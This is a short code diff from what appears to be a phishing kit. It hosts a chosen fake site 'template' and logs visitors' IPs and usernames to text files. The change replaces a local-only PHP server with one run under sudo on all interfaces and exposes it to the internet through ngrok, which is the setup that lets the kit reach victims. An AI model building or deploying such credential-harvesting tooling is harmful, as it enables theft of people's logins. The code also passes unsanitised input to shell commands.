@@ -102,9 +102,12 @@ Please Choose A Number To Host Template:
     port = input('What port do you want it on? :')
     #print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = f"php -t sites/{choice} -S 127.0.0.1:{port}"
-    p = subprocess.Popen(cmd_line, shell=True)
-    out = p.communicate()[0]
+    command1 = f"sudo php -t sites/{choice} -S 0.0.0.0:{port} &> /dev/null"
+    command2 = f"./ngrok http {port}"
+    os.system(command1)
+    os.system(command2)
+    # p = subprocess.Popen(cmd_line, shell=True)
+    # out = p.communicate()[0]
 
 
 except KeyboardInterrupt:
